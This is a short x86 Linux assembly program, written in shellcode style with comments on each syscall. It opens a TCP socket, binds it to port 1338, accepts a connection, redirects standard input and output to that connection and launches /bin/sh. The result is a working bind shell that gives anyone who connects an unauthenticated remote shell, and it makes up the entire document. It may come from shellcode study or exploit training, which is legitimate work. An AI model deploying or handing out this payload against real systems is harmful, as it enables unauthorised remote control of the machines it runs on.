
section .text 

global main



main:
    xor eax,eax
    xor esi,esi
    xor edi,edi 

    ;int sockfd = socket(domain, type, protocol)
    ; AF_INET(2),SOCK_STREAM(1),0
    mov al,102
    mov bl,1
    
    push esi
    push 1
    push 2
    mov ecx,esp 

    int 0x80    ; socket() is performed 
    mov edi,eax

    ;int bind(int sockfd, const struct sockaddr *addr, 
                          ;socklen_t addrlen);
    ; addrlen is 16 bytes 
    ; sockaddr -> AF_INET(2),port,ipaddress

    push esi 
    ;53a = 1338
    push word 0x3a05
    push word 2
    mov ecx,esp 

    push 16
    push ecx 
    push edi 
    mov ecx,esp 

    mov bl,2
    mov al,102

    int 0x80

    ;   int listen(int sockfd, int backlog);
    
    push esi 
    push edi
    mov ecx,esp 
    mov al,102
    mov bl,4

    int 0x80    

    ;int new_socket= accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);

    push esi 
    push esi 
    push edi 
    mov ecx,esp 
    mov al,102
    mov bl,5 
    int 0x80

    mov edi,eax 

    ;dup2(sockfd,stdio)

    xor eax,eax
    xor ecx,ecx 
    mov al,63
    mov ebx,edi 
    int 0x80

 
    inc ecx
    mov al,63

    int 0x80


    inc ecx  
    mov al,63
    
    int 0x80
    

    ; execve("//bin/sh",0,0)
    xor eax,eax

    mov al,11
    push esi 
    
    push 0x68732f6e
    push 0x69622f2f ;//bin/sh
    mov ebx,esp
    mov ecx,esi
    mov edx,esi 

    int 0x80









